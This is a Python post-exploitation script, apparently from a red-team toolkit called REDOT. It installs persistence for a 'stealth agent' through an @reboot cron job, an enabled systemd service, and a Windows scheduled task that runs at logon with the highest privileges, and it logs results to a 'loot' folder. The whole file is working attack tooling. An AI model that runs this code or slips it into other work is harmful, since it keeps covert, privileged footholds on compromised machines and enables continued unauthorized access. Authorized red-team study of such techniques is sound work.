#!/usr/bin/env python3
# persistence_injector.py — REDOT Post-Ex Persistence Module

import os
import platform
import subprocess
import json
from datetime import datetime

AGENTS_FILE = "recon/agent_inventory.json"
LOG_DIR = "loot/persistence"
os.makedirs(LOG_DIR, exist_ok=True)

def load_agents():
    try:
        with open(AGENTS_FILE, "r") as f:
            return json.load(f)
    except:
        return []

def inject_cronjob(agent):
    cron_line = "@reboot /usr/bin/python3 /opt/redot/stealth_agent.py\n"
    crontab_file = f"/tmp/cron_{agent['name']}.txt"
    try:
        with open(crontab_file, "w") as f:
            f.write(cron_line)
        subprocess.call(f"crontab {crontab_file}", shell=True)
        os.remove(crontab_file)
        return "[+] Cronjob persistence injected"
    except Exception as e:
        return f"[!] Error: {e}"

def inject_systemd(agent):
    service_name = f"redot_agent_{agent['name']}.service"
    service_path = f"/etc/systemd/system/{service_name}"
    try:
        with open(service_path, "w") as f:
            f.write(f"""[Unit]
Description=REDOT Stealth Agent Persistence
After=network.target

[Service]
ExecStart=/usr/bin/python3 /opt/redot/stealth_agent.py
Restart=on-failure

[Install]
WantedBy=multi-user.target
""")
        subprocess.call(f"systemctl enable {service_name}", shell=True)
        subprocess.call(f"systemctl start {service_name}", shell=True)
        return f"[+] Systemd service created: {service_name}"
    except Exception as e:
        return f"[!] Failed systemd injection: {e}"

def inject_windows_task(agent):
    task_name = f"REDOT_{agent['name']}_Agent"
    cmd = f'schtasks /Create /TN {task_name} /TR "python C:\\redot\\stealth_agent.py" /SC ONLOGON /RL HIGHEST /F'
    try:
        subprocess.call(cmd, shell=True)
        return f"[+] Windows task scheduled: {task_name}"
    except Exception as e:
        return f"[!] Windows task injection failed: {e}"

def main():
    print("=== REDOT Persistence Injector ===")
    agents = load_agents()
    if not agents:
        print("[-] No agents found.")
        return

    print("\nAvailable Agents:")
    for idx, agent in enumerate(agents):
        print(f"{idx+1}. {agent['name']} @ {agent['ip']}")

    try:
        choice = int(input("Select agent by number: ")) - 1
        agent = agents[choice]
    except:
        print("Invalid selection.")
        return

    os_type = platform.system().lower()
    print(f"[i] Detected OS: {os_type}")

    timestamp = datetime.utcnow().strftime("%Y%m%d_%H%M%S")
    log_file = os.path.join(LOG_DIR, f"{agent['name']}_{timestamp}.log")

    if "linux" in os_type:
        method = input("Select Linux method: [1] cron [2] systemd: ").strip()
        if method == "1":
            result = inject_cronjob(agent)
        else:
            result = inject_systemd(agent)
    elif "windows" in os_type:
        result = inject_windows_task(agent)
    else:
        result = "[x] Unsupported OS"

    print(result)
    with open(log_file, "w") as f:
        f.write(result)

if __name__ == "__main__":
    main()
